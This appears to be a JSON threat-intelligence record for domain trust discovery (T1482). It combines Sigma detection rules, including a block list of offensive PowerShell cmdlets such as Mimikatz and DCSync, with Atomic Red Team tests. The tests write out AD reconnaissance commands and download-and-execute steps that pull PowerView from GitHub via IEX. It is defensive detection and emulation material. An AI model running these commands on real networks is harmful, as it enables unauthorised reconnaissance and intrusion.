Invoke-ADSBackdoor\n    - Invoke-AllChecks\n    - Invoke-ARPScan\n    - Invoke-AzureHound\n    - Invoke-BackdoorLNK\n    - Invoke-BadPotato\n    - Invoke-BetterSafetyKatz\n    - Invoke-BypassUAC\n    - Invoke-Carbuncle\n    - Invoke-Certify\n    - Invoke-ConPtyShell\n    - Invoke-CredentialInjection\n    - Invoke-DAFT\n    - Invoke-DCSync\n    - Invoke-DinvokeKatz\n    - Invoke-DllInjection\n    - Invoke-DomainPasswordSpray\n    - Invoke-DowngradeAccount\n    - Invoke-EgressCheck\n    - Invoke-Eyewitness\n    - Invoke-FakeLogonScreen\n    - Invoke-Farmer\n    - Invoke-Get-RBCD-Threaded\n    - Invoke-Gopher\n    - Invoke-Grouper\n    - Invoke-HandleKatz\n    - Invoke-ImpersonatedProcess\n    - Invoke-ImpersonateSystem\n    - Invoke-InteractiveSystemPowerShell\n    - Invoke-Internalmonologue\n    - Invoke-Inveigh\n    - Invoke-InveighRelay\n    - Invoke-KrbRelay\n    - Invoke-LdapSignCheck\n    - Invoke-Lockless\n    - Invoke-MalSCCM\n    - Invoke-Mimikatz\n    - Invoke-Mimikittenz\n    - Invoke-MITM6\n    - Invoke-NanoDump\n    - Invoke-NetRipper\n    - Invoke-Nightmare\n    - Invoke-NinjaCopy\n    - Invoke-OfficeScrape\n    - Invoke-OxidResolver\n    - Invoke-P0wnedshell\n    - Invoke-Paranoia\n    - Invoke-PortScan\n    - Invoke-PoshRatHttp\n    - Invoke-PostExfil\n    - Invoke-PowerDump\n    - Invoke-PowerShellTCP\n    - Invoke-PowerShellWMI\n    - Invoke-PPLDump\n    - Invoke-PsExec\n    - Invoke-PSInject\n    - Invoke-PsUaCme\n    - Invoke-ReflectivePEInjection\n    - Invoke-ReverseDNSLookup\n    - Invoke-Rubeus\n    - Invoke-RunAs\n    - Invoke-SafetyKatz\n    - Invoke-SauronEye\n    - Invoke-SCShell\n    - Invoke-Seatbelt\n    - Invoke-ServiceAbuse\n    - Invoke-ShadowSpray\n    - Invoke-Sharp\n    - Invoke-Shellcode\n    - Invoke-SMBScanner\n    - Invoke-Snaffler\n    - Invoke-Spoolsample\n    - Invoke-SpraySinglePassword\n    - Invoke-SSHCommand\n    - Invoke-StandIn\n    - Invoke-StickyNotesExtract\n    - Invoke-SystemCommand\n    - Invoke-Tasksbackdoor\n    - Invoke-Tater\n    - Invoke-Thunderfox\n    - Invoke-ThunderStruck\n    - Invoke-TokenManipulation\n    - Invoke-Tokenvator\n    - Invoke-TotalExec\n    - Invoke-UrbanBishop\n    - Invoke-UserHunter\n    - Invoke-VoiceTroll\n    - Invoke-Whisker\n    - Invoke-WinEnum\n    - Invoke-winPEAS\n    - Invoke-WireTap\n    - Invoke-WmiCommand\n    - Invoke-WScriptBypassUAC\n    - Invoke-Zerologon\n    - MailRaider\n    - New-HoneyHash\n    - New-InMemoryModule\n    - Out-Minidump\n    - Port-Scan\n    - PowerBreach\n    - 'powercat '\n    - PowerUp\n    - PowerView\n    - Remove-Update\n    - Set-MacAttribute\n    - Set-Wallpaper\n    - Show-TargetScreen\n    - Start-CaptureServer\n    - Start-WebcamRecorder\n    - VolumeShadowCopyTools\nfalsepositives:\n- Unknown\nid: 7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c\nlevel: high\nlogsource:\n  category: ps_module\n  definition: 'Requirements: PowerShell Module Logging must be enabled'\n  product: windows\nmodified: 2023/01/23\nreferences:\n- https://adsecurity.org/?p=2921\n- https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries\n- https://github.com/BC-SECURITY/Invoke-ZeroLogon/blob/111d17c7fec486d9bb23387e2e828b09a26075e4/Invoke-ZeroLogon.ps1\n- https://github.com/xorrior/RandomPS-Scripts/blob/848c919bfce4e2d67b626cbcf4404341cfe3d3b6/Get-DXWebcamVideo.ps1\n- https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/6f23bb41f9675d7e2d32bacccff75e931ae00554/OfficeMemScraper.ps1\n- https://github.com/dafthack/DomainPasswordSpray/blob/b13d64a5834694aa73fd2aea9911a83027c465a7/DomainPasswordSpray.ps1\n- https://unit42.paloaltonetworks.com/threat-assessment-black-basta-ransomware/\n- https://research.nccgroup.com/2022/06/06/shining-the-light-on-black-basta/\n- https://github.com/calebstewart/CVE-2021-1675\n- https://github.com/BloodHoundAD/BloodHound/blob/0927441f67161cc6dc08a53c63ceb8e333f55874/Collectors/AzureHound.ps1\n- https://bloodhound.readthedocs.io/en/latest/data-collection/azurehound.html\n- https://github.com/HarmJ0y/DAMP\n- https://github.com/samratashok/nishang\n- https://github.com/DarkCoderSc/PowerRunAsSystem/\n- https://github.com/besimorhino/powercat\nrelated:\n- id: 89819aa4-bbd6-46bc-88ec-c7f7fe30efa6\n  type: similar\n- id: 02030f2f-6199-49ec-b258-ea71b07e03dc\n  type: similar\nstatus: test\ntags:\n- attack.execution\n- attack.discovery\n- attack.t1482\n- attack.t1087\n- attack.t1087.001\n- attack.t1087.002\n- attack.t1069.001\n- attack.t1069.002\n- attack.t1069\n- attack.t1059.001\ntitle: Malicious PowerShell Commandlets - PoshModule\n",
                            "sigma:id": "7d0d0329-0ef1-4e84-a9f5-49500f9d7c6c",
                            "title": "Malicious PowerShell Commandlets - PoshModule",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "3bad990e-4848-4a78-9530-b427d854aac0",
                        "lookup_data": {
                            "description": "Identifies execution of nltest.exe and dsquery.exe for domain trust discovery. This technique is used by attackers to enumerate Active Directory trusts.",
                            "raw": "author: E.M. Anhaus (originally from Atomic Blue Detections, Tony Lambert), oscd.community,\n  omkar72\ndate: 2019/10/24\ndescription: Identifies execution of nltest.exe and dsquery.exe for domain trust discovery.\n  This technique is used by attackers to enumerate Active Directory trusts.\ndetection:\n  condition: 1 of selection*\n  selection_dsquery_v1:\n    CommandLine|contains: trustedDomain\n    Image|endswith: \\dsquery.exe\n  selection_dsquery_v2:\n    CommandLine|contains|all:\n    - -filter\n    - trustedDomain\n    Image|endswith: \\dsquery.exe\n  selection_nltest_v1:\n    CommandLine|contains:\n    - domain_trusts\n    - all_trusts\n    - /trusted_domains\n    - /dclist\n    Image|endswith: \\nltest.exe\nfalsepositives:\n- Legitimate use of the utilities by legitimate user for legitimate reason\nid: 3bad990e-4848-4a78-9530-b427d854aac0\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1482/T1482.md\n- https://eqllib.readthedocs.io/en/latest/analytics/03e231a6-74bc-467a-acb1-e5676b0fb55e.html\n- https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/\n- https://redcanary.com/blog/how-one-hospital-thwarted-a-ryuk-ransomware-outbreak/\n- https://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/\nrelated:\n- id: 77815820-246c-47b8-9741-e0def3f57308\n  type: obsoletes\nstatus: test\ntags:\n- attack.discovery\n- attack.t1482\ntitle: Domain Trust Discovery\n",
                            "sigma:id": "3bad990e-4848-4a78-9530-b427d854aac0",
                            "title": "Domain Trust Discovery",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "75df3b17-8bcc-4565-b89b-c9898acef911",
                        "lookup_data": {
                            "description": "Detects the execution of a AdFind for Active Directory enumeration",
                            "raw": "author: FPT.EagleEye Team, omkar72, oscd.community\ndate: 2020/09/26\ndescription: Detects the execution of a AdFind for Active Directory enumeration\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - objectcategory\n    - trustdmp\n    - dcmodes\n    - dclist\n    - computers_pwdnotreqd\n    Image|endswith: \\adfind.exe\nfalsepositives:\n- Administrative activity\nid: 75df3b17-8bcc-4565-b89b-c9898acef911\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/05/12\nreferences:\n- https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n- https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/master/fin6/Emulation_Plan/Phase1.md\n- https://thedfirreport.com/2020/05/08/adfind-recon/\nstatus: experimental\ntags:\n- attack.discovery\n- attack.t1018\n- attack.t1087.002\n- attack.t1482\n- attack.t1069.002\ntitle: Suspicious AdFind Execution\n",
                            "sigma:id": "75df3b17-8bcc-4565-b89b-c9898acef911",
                            "title": "Suspicious AdFind Execution",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "5e55be1a-3a30-48ae-9934-4199950d210f",
                        "lookup_data": {
                            "description": "Interesting Recon Script",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/5e55be1a-3a30-48ae-9934-4199950d210f.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1582912038",
                            "uuid": "5e55be1a-3a30-48ae-9934-4199950d210f",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
                        "lookup_data": {
                            "description": "Unwrapping Ursnifs Gifts - The DFIR Report",
                            "link": "http://www.botvrij.eu/data/feed-osint/4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc.json",
                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
                            "timestamp": "1674763285",
                            "uuid": "4bcf0465-4b53-4de4-8c53-fcc5f7d04dfc",
                            "_cycat_type": "Item"
                        }
                    }
                ]
            }
        },
        "atomics": [
            {
                "attack_technique": "T1482",
                "display_name": "Domain Trust Discovery",
                "atomic_tests": [
                    {
                        "name": "Windows - Discover domain trusts with dsquery",
                        "auto_generated_guid": "4700a710-c821-4e17-a3ec-9e4c81d6845f",
                        "description": "Uses the dsquery command to discover domain trusts.\nRequires the installation of dsquery via Windows RSAT or the Windows Server AD DS role.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "dsquery * -filter \"(objectClass=trustedDomain)\" -attr *\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Windows - Discover domain trusts with nltest",
                        "auto_generated_guid": "2e22641d-0498-48d2-b9ff-c71e496ccdbe",
                        "description": "Uses the nltest command to discover domain trusts.\nRequires the installation of nltest via Windows RSAT or the Windows Server AD DS role.\nThis technique has been used by the Trickbot malware family.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "dependencies": [
                            {
                                "description": "nltest.exe from RSAT must be present on disk\n",
                                "prereq_command": "WHERE nltest.exe >NUL 2>&1\n",
                                "get_prereq_command": "echo Sorry RSAT must be installed manually\n"
                            }
                        ],
                        "executor": {
                            "command": "nltest /domain_trusts\nnltest /trusted_domains\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Powershell enumerate domains and forests",
                        "auto_generated_guid": "c58fbc62-8a62-489e-8f2d-3565d7d96f30",
                        "description": "Use powershell to enumerate AD information.\nRequires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "PowerView PowerShell script must exist on disk\n",
                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\n"
                            },
                            {
                                "description": "RSAT PowerShell AD admin cmdlets must be installed\n",
                                "prereq_command": "if ((Get-Command \"Get-ADDomain\" -ErrorAction Ignore) -And (Get-Command \"Get-ADGroupMember\" -ErrorAction Ignore)) { exit 0 } else { exit 1 }\n",
                                "get_prereq_command": "Write-Host \"Sorry RSAT must be installed manually\"\n"
                            }
                        ],
                        "executor": {
                            "command": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\"\nGet-NetDomainTrust\nGet-NetForestTrust\nGet-ADDomain\nGet-ADGroupMember Administrators -Recursive\n([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Adfind - Enumerate Active Directory OUs",
                        "auto_generated_guid": "d1c73b96-ab87-4031-bad8-0e1b3b8bf3ec",
                        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory OUs\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "optional_args": {
                                "description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
                                "type": "string",
                                "default": null
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
                            }
                        ],
                        "executor": {
                            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=organizationalUnit) #{optional_args}\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Adfind - Enumerate Active Directory Trusts",
                        "auto_generated_guid": "15fe436d-e771-4ff3-b655-2dca9ba52834",
                        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Trusts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "optional_args": {
                                "description": "Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use \"-arg\" notation to add arguments separated by spaces.",
                                "type": "string",
                                "default": null
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n",
                                "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n"
                            }
                        ],
                        "executor": {
                            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" #{optional_args} -gcb -sc trustdmp\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Get-DomainTrust with PowerView",
                        "auto_generated_guid": "f974894c-5991-4b19-aaf5-7cc2fe298c5d",
                        "description": "Utilizing PowerView, run Get-DomainTrust to identify domain trusts. Upon execution, progress and info about trusts within the domain being scanned will be displayed.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Get-ForestTrust with PowerView",
                        "auto_generated_guid": "58ed10e8-0738-4651-8408-3a3e9a526279",
                        "description": "Utilizing PowerView, run Get-ForestTrust to identify forest trusts. Upon execution, progress and info about forest trusts within the domain being scanned will be displayed.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "TruffleSnout - Listing AD Infrastructure",
                        "auto_generated_guid": "ea1b4f2d-5b82-4006-b64f-f2845608a3bf",
                        "description": "Iterative AD discovery toolkit for offensive operators. Situational awareness and targeted low noise enumeration. Preference for OpSec.- https://github.com/dsnezhkov/TruffleSnout\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "trufflesnout_path": {
                                "description": "Path to the TruffleSnout executable",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\TruffleSnout.exe"
                            },
                            "domain": {
                                "description": "Domain name to search on",
                                "type": "string",
                                "default": "%userdomain%"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "TruffleSnout.exe must exist on disk at specified location (#{trufflesnout_path})\n",
                                "prereq_command": "if (Test-Path \"#{trufflesnout_path}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -ItemType Directory (Split-Path \"#{trufflesnout_path}\") -Force | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/dsnezhkov/TruffleSnout/releases/download/0.5/TruffleSnout.exe\" -OutFile \"#{trufflesnout_path}\"\n"
                            }
                        ],
                        "executor": {
                            "command": "\"#{trufflesnout_path}\" forest -n #{domain}\n\"#{trufflesnout_path}\" domain -n #{domain}\n",
                            "name": "command_prompt"
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 14:30:34"
}